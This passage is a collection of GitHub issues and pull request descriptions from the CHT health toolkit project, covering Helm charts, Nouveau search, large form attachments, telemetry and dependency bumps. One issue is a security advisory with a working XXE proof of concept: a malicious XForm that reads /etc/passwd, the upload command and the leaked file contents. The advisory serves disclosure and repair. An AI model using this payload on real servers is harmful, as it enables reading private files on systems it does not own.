- Ensures each unique contributor is listed once (based on login or name+email)
- Falls back to parsing `Co-authored-by:` if API data is incomplete (optional, if implemented)

This change makes the **contributors list more complete and fair**, especially for collaborative PRs.

Fixes: #10023

title: chore: bump rate-limiter-flexible from 5.0.5 to 7.1.1
body:
Bumps [rate-limiter-flexible](https://github.com/animir/node-rate-limiter-flexible) from 5.0.5 to 7.1.1.
Release notes

Sourced from rate-limiter-flexible's releases.

Check points before upserting with Redis

  • RateLimiterRedis limiter checks if points value is an integer and throws a clear error otherwise. This helps to avoid mysterious errors provided by Lua script when consuming a floating-point number of points, e.g. 2.1. Thank you @​roggervalf

:sun_with_face:

Etcd support

  • RateLimiterEtcd and RateLimiterEtcdNonAtomic were added. Read more on Wiki https://github.com/animir/node-rate-limiter-flexible/wiki/Etcd.

This is the first time we add atomic and non-atomic limiters for the same storage. Atomic increments are necessary to count sensitive things like incorrect password or PIN tries while non-atomic increments may be better (because they are faster) when exact count doesn't matter, e.g. to protect a service against DDoS attack.

Thank you @​Tobias4872 :grapes:

v7.0.0

What's Changed

  • feat: add RateLimiterValkeyGlide to support Valkey Glide @​avifenesh in animir/node-rate-limiter-flexible#302 Thank you!
  • X-RateLimit-Reset header example was fixed. It should be Math.ceil((Date.now() + rateLimiterRes.msBeforeNext) / 1000). Thanks to @​Fdavidtr.
  • [BREAKING CHANGE] Node.js 18 support removed.

New Contributors

  • @​avifenesh made their first contribution. Congrats!

Full Changelog: https://github.com/animir/node-rate-limiter-flexible/compare/v6.2.1...v7.0.0

:leopard:

SQLite: fix Knex connection issue

  • RateLimiterSQLite: This fixes an issue where an unused Knex connection remained open, causing pool connection problems. Additionally, this adds functions to run tests against Knex. Thanks to @​muco-rolle :pushpin:

Multiple SQLite clients support

  • RateLimiterSQLite supports sqlite3, better-sqlite3 and knex clients now. Set storeType option to one of sqlite3, better-sqlite3 or knex, defaults to sqlite3 if not set. Thank you @​muco-rolle :gift:

SQLite support

  • RateLimiterSQLite added. Thanks to @​no-on3 and @​muco-rolle rate-limiter-flexible supports SQLite now! :dolphin: Check SQLite example.

Just a day after Valkey limiter release we are releasing SQLite support. One new database and one old (but still good) added to the list of the big family. Congrats!

Valkey support [zap]

  • RateLimiterValkey added. Thanks to @​gurgunday rate-limiter-flexible supports Valkey now! :zap: It can be used with iovalkey package.

  • [breaking] Node.js support for version 16 was dropped.

title: chore(#10023): include commit co-authors in release notes
body:
<!--
Please use semantic PR titles that respect this format:

<type>(#<issue number>): <subject>
-->

# Description

This PR updates the `release-notes` script to correctly include **co-authors** in the list of contributors.

Previously, only the primary author of a commit (typically the person who merged the PR) was listed. This caused contributors to be underrepresented, especially when using squash merges where many co-authors are included via `Co-authored-by:` trailers.

With this update, the script:
- Uses the GitHub GraphQL API to fetch all commit `authors` for each relevant commit
- Ensures each unique contributor is listed once (based on login or name+email)
- Falls back to parsing `Co-authored-by:` if API data is incomplete (optional, if implemented)

This change makes the **contributors list more complete and fair**, especially for collaborative PRs.

Fixes: #10023

Release notes

Sourced from typedoc's releases.

v0.28.7

Features

  • Introduced the @sortStrategy tag to override the sort option on a specific reflection, #2965.

Bug Fixes

  • Classes and functions exported with export { type X } are no longer missing comments, #2970.
  • Setting locale to an unknown value will now cause TypeDoc to operate in English instead of a debug locale.
  • Array options will now report an error if set to a non-array/non-string value.

v0.28.6

Features

  • TypeDoc now supports resolving relative paths in links to the package directory as belonging to the project, #2961.
  • Declarations without comments will now check for comments on their export specifier, #2964.

Bug Fixes

  • Attempting to highlight a supported language which is not enabled is now a warning, not an error, #2956.
  • Improved compatibility with CommonMark's link parsing, #2959.
  • Classes, variables, and functions exported with export { type X } are now detected and converted as interfaces/type aliases, #2962.
  • Improved warning messaging for links to symbols which were resolved, but the symbols were not included in the documentation, #2967.
  • Fixed an issue preventing nested documents from being deserialized from TypeDoc's JSON output or used in packages mode, #2969.

Thanks!

title: feat(#10038): store parent/contact with dehydrated lineage instead of string
body:
WIP PR to store `parent` and `contact` fields with a dehydrated lineage.

We would need to fetch the parent and check its type and ensure it is one of the preconfigured/ allowedparents for the currently created place/person's contact_type
This parent if valid(meaning has a `contact_type` from one of the allowed `parents`  in the contact type object for the given input) will later be used to store `parent` field with de-hydrated lineage in a person/place doc.
Previously, we just stored the `string` containing the parent `id` instead of the de-hydrated lineage.

TODO: Store `contact` with lineage in a place, which shouldn't be as tricky given that there is no validation we'd have to do based on settings.

title: Add support for forms with large attachments
body:
## Overview

In-app training and workflows sometimes require large and high quality multimedia. At the moment, app form total attachment size is limited to a maximum of ~32MB per form, and [this has proven as not sufficient](https://forum.communityhealthtoolkit.org/t/support-for-larger-video-uploads-request-for-configurable-limit/5030) allowance for certain deployments, where compression is not feasible.

## Goals / Non-Goals

### Goals
- Upload forms with large attachments (above 32MB) through cht-conf. The new upload strategy integrates with the cht-conf feature that tracks config versions and alerts when the server has additional changes that would be overwritten by the upload. 
- CHT-Core API handles forms with large attachments on startup and when the forms are updated. 
- CHT-Core Webapp downloads updated forms from a new API endpoint in a way that large attachments can be downloaded reliably, instead of relying on the standard bulk replication download. 
- CHT-Core Webapp stores large form attachments in a way that they are easily and quickly retrievable, and are not susceptible to read/write bugs due to Chrome versions and implementations of IndexedDb. 
- Loading forms with large attachments has acceptable performance in CHT-Core Webapp. 
- This feature does not affect the overall performance of CHT-Core Webapp. 

### Non-goals
- Adding support for engineers to upload reports with large attachments
- Adding support to load files in forms from the device’s external storage (side-loaded media)
- Increase the JSON parse limit in API

## Risks and mitigations
- Downloading the large files in bulk might be prone to frequent restarts due to unstable connections. One way to mitigate this is to make downloads as small as possible (download files individually or somehow implement an interruptible stream)
- Storing extremely large files as PouchDb attachments is risky, as we have observed concerning behaviors in the past. Since PouchDb depends on the implementation of IndexedDb in the browser, this is open to different behavior based on the Webview version. 
-  If storing media as PouchDb attachments proves to be unfeasible, other modes of storing these attachments have to be investigated. For example [the local file system api](https://developer.chrome.com/docs/capabilities/web-apis/file-system-access). This would require further Webapp code changes to update storage and retrieval of the media attachments.  
- Determine what is the largest media size (in total) that is acceptable to load in a single form (account for slow disk reads and Enketo rendering time). An upper limit might be determined for documentation.

## Testing
- Unit tests for validation and logic (100% coverage) for all changes. Unit tests are added progressively as the feature gets developed. 
- E2E tests with latest and minimum chrome browser, both for initial and ongoing replication. E2E tests are added progressively, as the feature gets developed. 
- Load test with extremely large attachments, both on the server and on the client. 
- Full UAT test with Android app. 


**Additional context**
Forum squad post: https://forum.communityhealthtoolkit.org/t/forms-with-large-file-attachment-squad/5044
Forum request: https://forum.communityhealthtoolkit.org/t/support-for-larger-video-uploads-request-for-configurable-limit/5030

title: Update how API handles form updates on change
body:
**Describe the issue**
When CHT-API receives a form update, it reads the full contents of the form document, including _all_ attachments. 
If attachments are large, or only media attachments have received changes, this operation is expensive and pointless. 

**Describe the improvement you'd like**
Relevant code: https://github.com/medic/cht-core/blob/989c9d67cfa95ff14fa1164400cfecc8b9dcf065/api/src/services/generate-xform.js#L260

Update this code so that only the relevant xml attachments are read, instead of all media attachments. Same, if the xml attachment was changed, only save that attachment instead of the whole form. 

**Describe alternatives you've considered**
Keep it as it is.

title: Update API startup form updates to not load all attachments with _all_docs
body:
**Describe the issue**
Besides making unnecessary load on the server when there are very large media attachments for forms, CouchDb also has a long-lived bug where it times of if very large attachments are read through an _all_docs call: https://github.com/apache/couchdb/issues/2210

**Describe the improvement you'd like**
Relevant code: https://github.com/medic/cht-core/blob/989c9d67cfa95ff14fa1164400cfecc8b9dcf065/api/src/services/generate-xform.js#L276

Update this code to load attachments separately from the _all_docs request, and only load relevant attachments, instead of all media attachments. 

**Describe alternatives you've considered**
Still load all attachments (could be GBs of data!!), but switch the request type from _all_docs to _bulk_get (which might not time out).

title: Implement a `getForm` replication endpoint
body:
**Describe the issue**
Some forms could have very large attachments. Leaving form downloads as part of the normal replication protocol, where documents are downloaded in bulk, creates a high risk of timeouts due to very large payloads. 

**Describe the improvement you'd like**
Add a new replication endpoint `getForm` that will return the form document. 
Assess the performance of this endpoint by testing it on a slow / unstable connection and with very large attachments (create a form with 10 video attachments, each with the size of 100MB and attempt to download this form on an unstable connection). 

**Describe alternatives you've considered**
Simply revert to use db-doc GET with or without attachment payloads, since these endpoints already exist.

title: Assess whether PouchDb can store very large media as attachments to documents
body:
**Describe the issue**
We have past knowledge that PouchDb (inherently through the IndexedDb implementation) has some limitations on the size of attachments that it can store safely (without crashes): https://github.com/medic/cht-core/issues/6699

Assess what is the maximum size of attachment and collection of attachments can be stored and retrieved successfully, and with acceptable performance in PouchDb. 

This test should be conducted on a variety of devices (desktop, a variety of mobile phones) across a range of performance capabilities and Webview versions. The test should cover adding one large attachment, up to a range of large attachments, to assess where the system begins to be unstable. 

The result of this investigation should be clear limitations of the systems analyzed through empirical means.

title: Update Webapp initial replication to download forms separately
body:
**Describe the issue**
Forms might have very large attachments, which makes it risky to download in bulk, as the rest of the documents are downloaded during initial replication. 

**Describe the improvement you'd like**
Use a different endpoint to download forms or attachments individually during initial replication: https://github.com/medic/cht-core/blob/da5fe7f731303c6f69315b3992455125f539f91a/webapp/src/js/bootstrapper/initial-replication.js#L75


**Describe alternatives you've considered**
Leave it as it is.

title: Update Webapp ongoing replication to downloads forms separately
body:
**Describe the issue**
Forms might have very large attachments, which makes it risky to download in bulk, as the rest of the documents are downloaded during ongoing replication.

**Describe the improvement you'd like**
Use a different endpoint to download forms or attachments individually during onfoing replication: https://github.com/medic/cht-core/blob/167edb35b37c2cf87cdbba2894bdbdc5c3d4bd78/webapp/src/ts/services/replication.service.ts#L74

**Describe alternatives you've considered**
Leave it as it is.

title: Add ability to display previous month's targets
body:
**Is your feature request related to a problem? Please describe.**
Each month, community health workers (CHWs) submit reports to their supervisors and key stakeholders, including health center managers, village chiefs, and other community leaders. Presentation meetings are typically held between the 5th and 15th of the month, during which CHWs share the indicators from the previous reporting period.

The CHW’s “Analysis” tab displays the current month’s indicators. These indicators are reset to zero at the end of each month, making it difficult for CHWs to view and present data from the previous month using this tab. While it’s possible to access past indicators via the “Contact” tab, that section already contains a large volume of information, including the list of medications.

**Describe the solution you'd like**
Introduce a toggle or dropdown within the “Analysis” tab that allows users to switch between “Current Month” and “Previous Month.”

**Additional context**
* [Forum post](https://forum.communityhealthtoolkit.org/t/enable-community-health-workers-to-view-last-months-statistics-in-the-analytics-tab/5122/3) discussing the need
* Forum post forming the squad [in English](https://forum.communityhealthtoolkit.org/t/chw-previous-month-in-app-targets-squad/5279) and [in French](https://forum.communityhealthtoolkit.org/t/squad-equipe-pour-mettre-en-place-la-fonctionnalite-dacces-des-indicateurs-du-mois-precedent-aux-asc/5281)

title: Extract common patterns from CouchDB helm charts templates into reusable helper templates
body:
**Describe the issue**
Extract common patterns from CouchDB helm charts templates into reusable helper templates to improve maintainability and reduce code duplication.

**Describe the improvement you'd like**
Following the pattern used in persistent-volume.yaml with the `platforms.persistentVolume` helper template, we should apply the same modular approach to other CouchDB templates.

**Describe alternatives you've considered**
1. Keep current approach: leave the main deployment logic as-is. This would be the least disruptive but wouldn't achieve the full modularity benefits.
2. Use Helm subcharts: Rewrite CouchDB as a separate subchart with its own templates. This would be more complex and might be overkill for the current scope.

title: Complete manual testing of Helm chart scenarios
body:
**Describe the issue**
Complete manual testing of the Helm chart across all deployment scenarios to catch any issues not covered by automated integration tests.

**Describe the improvement you'd like**
Test all deployment scenarios to validate that the Helm chart works correctly in real environments. Issues found during testing are logged and addressed.

**Note:** This effort can be divided by creating sub-issues for individual scenarios or platform groups to allow parallel work.

**Testing Scenarios to Complete:**
**K3s-K3d Platform:**
- [ ] 1. New, single, k3s-k3d
- [X] 2. New, multi, k3s-k3d (tested with the integration tests)
- [ ] 3. Migration, single, k3s-k3d + upgrade
- [ ] 4. Migration, multi, k3s-k3d

**EKS Platform:**
- [ ] 5. New, single, eks
- [ ] 6. New, multi, eks + upgrade
- [ ] 7. Migration, single, eks
- [ ] 8. Migration, multi, eks + upgrade

**GKE Platform:**
- [ ] 9. New, single, gke
- [ ] 10. New, multi, gke + upgrade
- [ ] 11. Migration, single, gke
- [ ] 12. Migration, multi, gke + upgrade

title: Add README for Helm chart usage
body:
**Describe the issue**
The Helm chart directory lacks documentation that explains how to use the charts, what configuration options are available, and how to deploy in different scenarios.

**Describe the improvement you'd like**
Create a comprehensive README.md file in the Helm chart directory.

**Describe alternatives you've considered**
Rely on inline comments, keep documentation only in the template files as comments. This would be minimal effort, but it makes it hard for users to get a complete overview.

title: Show error screen if edit user details fail to load in admin app
body: **What feature do you want to improve?** If something happens that prevents successful loading of user details when editing a user in the admin app, the edit modal still loads but with empty fields because data for those fields could not be fetched. For example oidc_username is loaded via an API call that could fail. This is because the [model population failure is not handle gracefully](https://github.com/medic/cht-core/blob/3912847eff9c8b5e7f51cad74e0e43a307067915/admin/src/js/controllers/edit-user.js#L181). **Describe the improvement you'd like** Show an error modal if all the user details could not be loaded. **Describe alternatives you've considered** n/a **Additional context** With Chromes DevTool's Throttling set to "Offline", the full details of a SSO user do not load. vs (no throttling)

title: Extension Libs failing in offline Users
body: **Describe the bug** The [Extensions Lib](https://github.com/medic/cht-core/issues/7824) feature introduced in `4.2.0` works as expected when offline users are online, but going offline, results to the extension lib missing. **To Reproduce** 1. Add an extension lib 2. Add it to a form. 3. Push the configs to the instance including the extension libs 4. Login as an offline user to the instance using the cht-android-wrapper or use a browser. 5. Sync. 6. Test if the extension lib is working online. 7. Turn off internet access. (In the browser, enable offline in the developer tools network tab. 8. Close the app or close the browser tab. 9. Reopen the app or reopen the browser tab using the URL. 10. Open the form with the extension lib **Expected behavior** Extension lib is cached and can be accessed even offline as other forms are available offline. **Logs** N/A See attached screenshot. **Screenshots** **Environment** - Instance: (eg: alpha.dev.medicmobile.org, etc) - https://turkana.echis.go.ke - Browser: (eg: Firefox, Chrome, incognito mode, etc, which worked, which didn't) - cht-android-wrapper - Client platform: (eg: Windows, MacOS, Linux) - Android - App: (eg: webapp, admin, sentinel, api, couch2pg, cht-conf, etc) - webapp - Version: (eg: 2.15.0, 3.0.0, etc) 4.11.0 **Additional context** This was the first time at MOH Kenya, that we were using extension libs to manipulate the forms to allow for campaign type selection. The extension lib was used to manipulate the DOM and redirect the user to the right form based on what they had selected and take them to the right form. This would reduce the number of campaigns forms that need to be displayed to the Community Health Volunteers when doing campaigns.

title: Cleanup workflow fails for all contributors with forked repositories
body:
**Describe the bug**
The scheduled cleanup workflow (`/.github/workflows/cleanup.yml`) fails daily for all contributors who have forked the cht-core repository. The workflow attempts to connect to Medic's internal market databases using the `AUTH_MARKET_URL` secret, which is not available in forks, causing the process to exit with code 1.

Contributors should not see daily workflow failures for functionality that doesn't apply to their forks as shown in the attachment above.

**Logs**
```
Error deleting old CI builds: "getaddrinfo ENOTFOUND undefined"
Process completed with exit code 1.
```

**Workaround:**
Contributors can manually disable the workflow in their forks, but this doesn't help future forks and creates maintenance overhead.

title: feat(#9707): add nouveau to helm charts
body:
This adds a new pod and service for nouveau.

some notes:

- it does not add a new volume for nouveau data, instead it uses the same volume that couchdb uses. Nouveau is supposed to be mostly transparent, essentially just a part of couchdb, so we don't want to ask deployers to provision space for a separate volume, the size of which will be unknown and difficult to estimate. Also the main point of nouveau is to reduce storage space, so we don't want to have to ask for more instead. For multi-node couchdb this is a little complicated, because of course each couch node has its own volume, but we don't want nouveau to duplicate nouveau data for each node. So one solution is to just use the volume from the first couchdb node. This means both the storage size and IO will be imbalanced; the first node will be larger and busier in terms of IO operations than other nodes. For now, I'm assuming that this won't significant, but its something we should verify somehow; is the performance of the first couchdb node going to be significantly worse because of the extra IO operations from nouveau?
- For the nouveau instance it does add a new pod; if we really wanted to have all the resources for nouveau be combined with couchdb, we could add a nouveau container to each existing couchdb pod, instead of a new pod. This is also a change from the current performance; all freetext searches will use a single nouveau instance even if couchdb is clustered. We should also verify that that won't become a bottleneck, but it seems unlikely.
- Its mounted on a hardcoded subdirectory and will ignore the settings for preexisting data. Which means nouveau indexes will have to rebuild after a new deployment even if using preexisting data, which is a change from previous behavior where views would come along with the other data. But I don't think its worth it to add new settings for nouveau data paths, which no one is going to know or want to care about.
- I'm not sure what the tolerations are for, so I copied them from the couchdb template.

title: Remove upgrade service from Helm charts
body:
**Describe the issue**
As part of the 5.0 milestone, we should remove the upgrade service from the Helm charts. This service is no longer appropriate for Kubernetes deployments and can be safely removed to reduce confusion and prevent misuse.

**Describe the improvement you'd like**
Remove the upgrade service from the Helm charts entirely, starting with the 5.0 milestone. Kubernetes-based deployments should rely solely on Helm for upgrades.

**Describe alternatives you've considered**
We considered keeping the upgrade service and warning users against using it, but this would still carry risk of misuse and maintenance burden.

title: feat(#9542)!: replace freetext search views with Nouveau
body:
# Description

BREAKING CHANGE: a new container, `couchdb-nouveau`, has been added to the CHT architecture. This container is used by CouchDB to perform freetext searches. Deployments using the cht-upgrade-service and Docker Compose will be able to seamlessly upgrade. The new container `couchdb-nouveau` will be automatically initialized during the upgrade. Other types of CHT deployments (e.g. those running on Kubernetes) _will require manual steps_ to upgrade.

Closes https://github.com/medic/cht-core/issues/9542

Summary:

This PR updates the CHT server to use the [CouchDB Nouveau](https://docs.couchdb.org/en/stable/ddocs/nouveau.html) service to perform freetext searches of contacts/reports. This replaces the old approach which used normal Couch views for these freetext searches.  The Nouveau indexes are dramatically more efficient at storing the search data. So, while users should not perceive any change to the application _behavior_, the amount of disk space required for storing CHT data on the server has been significantly reduced (a reduction of `~30%` of the _total disk used_ has been measured for large CHT instances).

Details:

- Removes the following freetext views `medic-client` ddoc:
  - `contacts_by_freetext`
  - `contacts_by_type_freetext`
  - `reports_by_freetext`
- Adds new Nouveau indexes to the `medic` ddoc to support server-side freetext searches:
  - `contacts_by_freetext`
  - `reports_by_freetext`
- Adds a new `medic-offline-freetext` ddoc created automatically by webapp for offline users. This ddoc contains all the original freetext views in order to continue supporting freetext searching for offline users (who will not be able to call through to the Nouveau service).
- Dockerfile  configuration has been added for the `couchdb-nouveau` container.
- The Docker Compose configuration and Helm charts have been updated to include the Nouveau container
- The freetext search functionality in cht-datasource has been enhanced to toggle between searching via Nouveau or via the `medic-offline-freetext` indexes (based on the presence of the `medic-offline-freetext` ddoc).
  - All cht-core code that performs freetext searches (including `shared-libs/search`) has been updated to consume cht-datasource.

title: Protect against XXE attack
body:
Details in [private issue](https://github.com/medic/medic-projects/issues/8242), but have since been made public here:

When transforming xforms xml to html, the CHT api spawns a child process that runs xsltproc. This allows authenticated administrators to read arbitrary files from the api server filesystem by uploading malicious XForm files. See OWASP for [more info XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).

## Medic's assessment 
Only admin users can upload forms and they already know the `medic` user password.  The entire contents of the API container are already published as all of the CHT is open source (see [API container source](https://github.com/medic/cht-core/tree/master/api)). Any clear text secrets that may be in the API container are in the app settings config, which the admin users already has access to. 

That said, the CHT API process runs as root in docker container, so has access to every file on the container (but not on the host).  It would be good to solve this vulnerability and Medic is looking toward the community to assist on this with the `Help Wanted` label.  There is a chance in the future this could be chained with another vulnerability that doesn't yet exist.

## Vulnerable Component and Location
- File: [/api/src/services/generate-xform.js](https://github.com/medic/cht-core/blob/master/api/src/services/generate-xform.js)
- Function: `transform()` (lines [35-48](https://github.com/medic/cht-core/blob/8abb72c6b2f741ffbfff347c11b4226f7418bbd0/api/src/services/generate-xform.js#L35))
- Root Cause: The xsltproc command is spawned without security flags to disable external entity processing
- Vulnerable Code:
   ```javascript
   const xsltproc = childProcess.spawn(XSLTPROC_CMD, [ stylesheet, '-' ]);
   xsltproc.stdin.write(formXml); // Untrusted XML with external entities
   ```

## Steps to reproduce


1. Set up CHT Core latest (currently 4.21.1 but tested through 5.0 Beta 1)  
2. Create a malicious XForm file  in `./cht_core/config/default/forms/app/form_passwd.xml`  and matching JSON in ` `./cht_core/config/default/forms/app/form_passwd.json`  ` (see below for contents).
3. Upload the form through CHT conf, changing `url` to the value of your test instance: `cht --url="https://medic:password@192-168-68-26.local-ip.medicmobile.org:10454"  --skip-validate upload-app-forms  -- form_passwd`
4. The form processing pipeline resolves the external entities and embeds file contents in the generated HTML form. This means the targeted file is only included in the form at the time it's uploaded - it is not dynamically included every time the form is accessed. 
5. File form  can be accessed by any logged in user at `/medic/form%3Aform_passwd/form.html` as show in this URL: https://192-168-68-26.local-ip.medicmobile.org:10454/medic/form%3Aform_passwd/form.html

### Sample form contents 

an example malicious xform called `form_passwd.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<h:html xmlns="http://www.w3.org/2002/xforms" xmlns:h="http://www.w3.org/1999/xhtml" xmlns:ev="http://www.w3.org/2001/xml-events" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:jr="http://openrosa.org/javarosa">
  <h:head>
    <h:title>XXE: /etc/passwd</h:title>
    <model>
      <instance>
        <xxe_test id="xxe_test">
          <meta>
            <instanceID/>
          </meta>
        </xxe_test>
      </instance>
      <bind nodeset="/xxe_test/test_field" type="string"/>
      <bind calculate="concat('uuid:', uuid())" nodeset="/xxe_test/meta/instanceID" readonly="true()" type="string"/>
    </model>
  </h:head>
  <h:body>
      <label> &xxe;</label>
  </h:body>
</h:html>
```

and  `form_passwd.json`

```json
{
  "internalId": "hostname_xxe_test",
  "title": "XXE Hostname Test",
  "type": "form",
  "xmlVersion": "1.0.0",
  "_id": "form:hostname_xxe_test",
  "context": {
    "person": false,
    "place": false,
    "expression": "true"
  }
}
```

### Resulting ouput in a browser 

Resulting page shows  contents of `/etc/passwd`:

```
XXE: /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
smang:x:1001:1001::/home/smang:/bin/sh
```

title: Record telemetry for External Android App calls
body:
**Is your feature request related to a problem? Please describe.**
The CHT supports [launching 3rd Party Android apps](https://docs.communityhealthtoolkit.org/building/forms/app/#android-app-launcher) from within a form and then recording the response data from the app as fields on the report.

Unfortunately, we are not actually collecting any [telemetry data](https://docs.communityhealthtoolkit.org/technical-overview/data/performance/telemetry/) right now regarding the frequency of use of this feature and/or how long is spent in the 3rd Party app. This information is important to organizations deploying this feature so they can measure adoption and/or identify performance bottlenecks.  

**Describe the solution you'd like**

We should update the [android-app-launcher.service.ts](https://github.com/medic/cht-core/blob/master/webapp/src/ts/services/android-app-launcher.service.ts) to collect this telemetry data (reference similar code in the [form service](https://github.com/medic/cht-core/blob/master/webapp/src/ts/services/form.service.ts)):

- Add the [PerformanceService](https://github.com/medic/cht-core/blob/master/webapp/src/ts/services/performance.service.ts) as a constructor parameter.
- In the AndroidAppLauncherService, in the [`launchAndroidApp` method](https://github.com/medic/cht-core/blob/b2f81083316600fdfda7e041ab2a8d80d07192ec/webapp/src/ts/services/android-app-launcher.service.ts#L31), call the `performanceService.track()` function (save the returned value as a class-level variable).
- In the [`resolveAndroidAppResponse` method](https://github.com/medic/cht-core/blob/b2f81083316600fdfda7e041ab2a8d80d07192ec/webapp/src/ts/services/android-app-launcher.service.ts#L18) call `stop` on the tracking object with the name `enketo:external-app:${action}` where `action` is the field from the ChtAndroidApp parameter given to the `launchAndroidApp` method.

We should also be sure to document the new telemetry value [on the docs page](https://docs.communityhealthtoolkit.org/technical-overview/data/performance/telemetry/).

**Describe alternatives you've considered**
I have hacked in a some functionality for recording the duration of time spent in the external Android app as an _output_ value in [this cht-android branch](https://github.com/medic/cht-android/pull/398/commits/8d201a09d07d339b3addba512c629a0a57e04dab). This allows the duration to be recorded on the report/contact associated with the form.  However, this is not good for aggregating proper telemetry across an instance.

**Additional context**

One thing to keep in mind when recording this performance data is that it also includes the time spend by cht-android to serialize/de-serialize the intent data.  If there is a lot of data being communicated (e.g. image data) the Base64 conversion may result in a non-trivial amount of time being spend serializing it.  Regardless, the telemetry collected here should still reflect the user's experience of launching the external app and then returning to be able to continue in the form.
